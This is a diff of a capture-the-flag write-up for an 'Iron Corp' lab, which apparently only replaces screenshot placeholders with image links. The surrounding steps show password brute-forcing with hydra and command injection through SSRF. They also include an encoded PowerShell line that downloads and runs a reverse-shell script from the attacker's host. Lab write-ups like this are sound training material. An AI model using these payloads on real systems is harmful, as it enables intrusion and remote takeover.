@@ -19,7 +19,7 @@ sudo echo "IP ironcorp.me" >> /etc/hosts
 nmap -p- -sV ironcorp.me
 ```
 
-[SCREEN01]
+<img width="724" height="290" alt="SCREEN01" src="https://github.com/user-attachments/assets/c60fd6b3-31d9-432c-8f92-6e6a28da2547" />
 
 3. Attempt a DNS zone transfer to discover additional subdomains
    - **Results:** The zone transfer reveals two additional subdomains: `admin.ironcorp.me` and `internal.ironcorp.me`.
@@ -28,7 +28,7 @@ nmap -p- -sV ironcorp.me
 dig axfr @ironcorp.me ironcorp.me
 ```
 
-[SCREEN02]
+<img width="726" height="294" alt="SCREEN02" src="https://github.com/user-attachments/assets/5aa37ca0-b8bc-4dcf-a9b7-4be76c81b70f" />
 
 4. Add the discovered subdomains to the hosts file
 
@@ -43,13 +43,13 @@ sudo sh -c 'echo "IP admin.ironcorp.me" >> /etc/hosts && echo "IP internal.ironc
 hydra -l admin -P /root/Tools/wordlists/rockyou.txt -s 11025 admin.ironcorp.me http-get
 ```
 
-[SCREEN03]
+<img width="721" height="287" alt="SCREEN03" src="https://github.com/user-attachments/assets/5b34ada4-c1f4-4a34-8a0d-394fa2e68d22" />
 
 6. After authenticating to the admin panel, test for SSRF vulnerabilities. The application accepts a parameter `r` that makes requests to internal services
    - Test command injection through SSRF: `http://admin.ironcorp.me:11025/?r=http://internal.ironcorp.me:11025/name.php?name=test|whoami`
    - **Result:** Command execution confirmed - returns `nt authority\system`, indicating the web service runs with high privileges.
 
-[SCREEN04]
+<img width="969" height="199" alt="SCREEN04" src="https://github.com/user-attachments/assets/b458a285-99fc-4287-af34-402b41babfa8" />
 
 7. Set up a local HTTP server to host the PowerShell reverse shell payload
 
@@ -79,7 +79,7 @@ Using [CyberChef](https://gchq.github.io/CyberChef/), double URL encode the payl
 powershell%252Eexe%2520%252Dc%2520iex%2528new%252Dobject%2520net%252Ewebclient%2529%252Edownloadstring%2528%2527http%253A%252F%252F10%252E10%252E240%252E255%253A8000%252Fshell%252Eps1%2527%2529
 ```
 
-[SCREEN06]
+<img width="1679" height="550" alt="SCREEN06" src="https://github.com/user-attachments/assets/64e23c12-bdbf-4fdf-9032-41cb4e4160a3" />
 
 11. Execute the payload through the SSRF vulnerability: `http://admin.ironcorp.me:11025/?r=http://internal.ironcorp.me:11025/name.php?name=test|powershell%252Eexe%2520%252Dc%2520iex%2528new%252Dobject%2520net%252Ewebclient%2529%252Edownloadstring%2528%2527http%253A%252F%252F10%252E10%252E240%252E255%253A8000%252Fshell%252Eps1%2527%2529`
 
@@ -92,7 +92,7 @@ cd C:\Users
 more Administrator\Desktop\user.txt
 ```
 
-[SCREEN05]
+<img width="445" height="39" alt="SCREEN05" src="https://github.com/user-attachments/assets/39bc3eec-b8fa-4e02-9ef7-ede6119eca6f" />
 
 ---
 
@@ -105,4 +105,4 @@ get-acl c:\users\SuperAdmin | fl
 type c:\users\superadmin\desktop\root.txt
 ```
 
-[SCREEN07]
+<img width="722" height="289" alt="SCREEN07" src="https://github.com/user-attachments/assets/ff0640b0-2fe2-4b90-b285-d0c1ebcb0130" />
